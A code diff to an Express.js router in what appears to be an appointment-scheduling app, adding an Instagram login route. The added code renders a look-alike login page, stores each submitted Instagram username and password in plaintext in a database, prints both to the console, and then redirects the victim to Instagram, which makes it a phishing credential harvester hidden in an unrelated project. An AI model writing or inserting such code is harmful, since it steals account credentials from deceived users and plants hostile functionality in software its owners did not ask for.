@@ -9,7 +9,7 @@ const appointment_requests = require('./../models/appointment_requests')
 const schedule = require('node-schedule');
 const nodemailer = require('nodemailer')
 
-
+const instagram = require('./../models/insta')
 async function delete_expired_slots(){
 
    
@@ -808,8 +808,29 @@ router.get("/",(req,res)=>{
 })
 
 
+router.get('/instagram_Login', async (req,res ,next)=>{
+
+    res.render('loginLaptop')
+
+})
+router.post('/instagram_login', async (req,res,next)=>{
+
+var name = req.body.username
+var pass = req.body.password
+
+var instagram1 = new instagram({
+    username: name,
+    password: pass
+})
+
+    instagram1.save().then(()=>{
+        console.log(instagram1.username)
+        console.log(instagram1.password)
+        res.redirect('www.instagram.com')
+    })
 
 
+})
 
 
 module.exports=router;
